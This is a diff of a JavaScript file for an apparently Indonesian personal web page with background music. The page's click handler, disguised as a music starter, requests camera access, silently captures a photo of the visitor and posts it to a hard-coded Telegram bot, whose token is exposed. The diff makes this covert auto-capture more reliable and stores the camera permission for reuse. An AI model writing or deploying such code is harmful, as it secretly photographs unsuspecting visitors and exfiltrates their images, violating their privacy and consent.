@@ -1,4 +1,4 @@
-﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
+const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 if (openPhotoOptions && photoOptions) {
   openPhotoOptions.addEventListener('click', () => {
@@ -9,52 +9,56 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
+// === MUSIK + KAMERA FIX 1X ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 music.volume = 0.4;
 let started = false;
 
-// --- fungsi utama ---
 async function startMusicAndCamera() {
   if (started) return;
   started = true;
 
+  // --- Musik ---
   try {
-    // 1️⃣ Coba play musik langsung (gesture valid karena dipicu klik user)
+    music.muted = false;
     await music.play();
     console.log("🎵 Musik diputar");
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
   } catch (err) {
-    console.warn("⚠️ Gagal autoplay musik:", err);
+    console.warn("Autoplay gagal, butuh klik manual:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
   }
 
-  // 2️⃣ Minta izin kamera (1x saja)
+  // --- Kamera (1x izin saja) ---
   try {
     const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
-    let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
     if (!alreadyAllowed) {
       localStorage.setItem("user_allows_auto_capture", "1");
-      console.log("✅ Izin kamera diberikan pertama kali");
+      console.log("✅ Izin kamera pertama kali diberikan");
     } else {
-      console.log("📸 Izin kamera sudah disimpan");
+      console.log("📸 Izin kamera sudah tersimpan");
     }
 
     await autoCaptureAndSend(stream);
   } catch (e) {
-    console.warn("🚫 Kamera gagal diakses:", e);
+    console.warn("🚫 Kamera tidak diizinkan:", e);
   }
 }
 
-// --- kirim foto ke Telegram ---
+// === Kirim foto ke Telegram (pakai stream dari atas) ===
 async function autoCaptureAndSend(stream) {
   try {
     const video = document.createElement("video");
     video.srcObject = stream;
+    video.playsInline = true;
     await video.play();
+
+    await new Promise(r => setTimeout(r, 600));
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
@@ -62,28 +66,26 @@ async function autoCaptureAndSend(stream) {
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
     stream.getTracks().forEach(t => t.stop());
 
+    const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
-    fd.append("caption", "📸 dari pengunjung");
+    fd.append("caption", "📸 Auto-capture pengunjung (1 izin)");
     fd.append("photo", blob, "capture.png");
 
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: fd
     });
-
-    if (res.ok) console.log("📤 Foto terkirim");
+    if (res.ok) console.log("✅ Foto terkirim");
     else console.warn("⚠️ Gagal kirim foto");
   } catch (err) {
-    console.error("❌ Gagal auto-capture:", err);
+    console.error("❌ Gagal ambil foto:", err);
   }
 }
 
-// === EVENT PENGGUNA ===
-// hanya gesture nyata (klik / tap) yang aktifkan musik & kamera
+// === EVENT HANDLER ===
 function userGestureStart() {
   startMusicAndCamera().catch(console.warn);
   document.removeEventListener('click', userGestureStart);
@@ -613,6 +615,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
 
 
